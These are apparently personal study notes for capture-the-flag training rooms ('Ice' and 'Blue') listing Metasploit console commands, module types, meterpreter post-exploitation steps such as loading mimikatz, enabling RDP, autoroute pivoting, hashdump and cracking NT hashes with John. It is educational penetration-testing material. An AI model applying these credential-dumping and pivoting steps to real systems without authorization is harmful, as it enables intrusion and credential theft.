# MetaSploit

## Commands for ice room

### Initializing
~~~
msfdb init (initialises database)
msfdb reinit (delete and reinitialize the database)
db_status (status of database)
~~~

### Rock 'em to the Core 
~~~
search (search for modules)
use (use a module)
info (info on a module)
connect (netcat like, quick connections)
set (sets value of variable)
setg (sets global variables)
get (view a single variable)
spool (set console output to a save file)
save (saves previously set values)
unset (changing a value to null)
~~~

### Modules for Ever Occasion 

Modules

- exploit
Holds all the exploit code.

- payload
Contains payload code.

- auxilliary 
Module used in scanning and verfication.

- post
Module allows to loot and piviot after gaining access.  

- nop
Buffer overflow and ROP (Return Oriented Programming) attack modules 

- load
Loads modules that are not loaded by default

### Move that shell! 

~~~
db_nmap (runs nmap in metasploit)
vulns (shows vulnerabilities that metasploit has found, seems different from nmap script=vulns)
set LHOST (set IP of listening machine)
set RHOST (set IP of target)
expolit (runs exploit)
run -j (runs as a job) 
~~~

### We're in, now what?

Commands when we have meterpreter shell
~~~
ps (lists processes)
migrate <PID> (moves to another process)
getuid (lists current user)
sysinfo (more information out the the system)
getprivs (gets the privileges of the user)
load kiwi (loads mimikatz)
upload (uploads files to computer)
run post/windows/gather/checkvm (checks if the target is a vm)
run post/multi/recon/local_exploit_suggester (checks for exploits to elevate privileges)
run post/windows/manage/enable_rdp (enables remote desktop)
~~~
 
### Makin' Cisco Proud 

~~~
run autoroute (creates a new route through a meterpreter shell to piviot deeper into network)
run autoroute -s <sub-net IP> -n <subnet mask IP> (creates route to sub-net).
use auxiliary/server/socks_proxy (starts socks5 server)
proxychains (run outside of metaspolit, run commands through socks5 server if config /etc/proxychains.conf 
~~~

### Useful commands

~~~
jobs -v (list all jobs)
bg/ctrl + z (backgrounds current session)
sessions -i* (lists all the background sessions) 
shell (gets a normal shell, ctrl + d returns to meterpreter shell)
~~~

## Blue room

Shell to Meterpreter Upgrade

~~~
sessions -u <session wishing to updgrade>
use post/multi/manage/shell_to_meterpreter
~~~

- Just because we are system doesn't mean our process is. Once we are upgraded we need to migrate to another process.

- hashdump passwords

~~~
hashdump (run in metasploit)
john -w=/usr/share/wordlists/rockyou.txt --format=NT <file with hashes> (For this room I needed to speicify the has type)
~~~